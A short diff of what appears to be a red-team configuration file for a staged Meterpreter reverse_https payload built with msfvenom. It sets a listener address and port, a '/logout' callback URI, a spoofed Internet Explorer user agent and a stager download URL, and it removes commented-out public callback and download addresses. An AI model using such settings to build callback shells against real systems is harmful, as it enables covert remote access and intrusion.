@@ -5,7 +5,6 @@
 
 # payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
 payload="windows/x64/meterpreter/reverse_https"
-#ListenerIP=185.117.155.19
 ListenerIP=192.168.88.19
 ListenerPort=8443
 ListenerURI="/logout"
@@ -15,7 +14,6 @@ ProxyPort=""
 ProxyUser=""
 ProxyPass=""
 UserAgent="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
-#DownloadURL="https://darksh3ll.info/testtesttest"
 DownloadURL="http://192.168.88.19:8080"
 
 # payload options one liner
